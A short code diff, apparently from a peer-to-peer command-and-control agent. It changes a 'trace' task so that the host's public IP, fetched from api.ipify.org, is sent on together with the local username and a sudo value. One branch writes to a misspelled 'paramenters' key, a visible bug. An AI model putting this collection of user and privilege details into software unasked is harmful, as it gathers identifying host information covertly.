@@ -100,9 +100,9 @@ def p2p_server(task_id):
                                         if task["command"] == "trace":
                                             ip = requests.get('https://api.ipify.org').text
                                             if task["parameters"] == "":
-                                                task["parameters"] = ip
+                                                task["parameters"] = getpass.getuser() + "@" + ip + ";" + sudo
                                             else:
-                                                task["paramenters"] += ";" + ip
+                                                task["paramenters"] += " --> " + getpass.getuser() + "@" + ip + ";" + sudo
                                             message = to64(message_uuid) + to64(str(message))
                                             self.protocol_version = "HTTP/1.1"
                                             self.send_response(200)
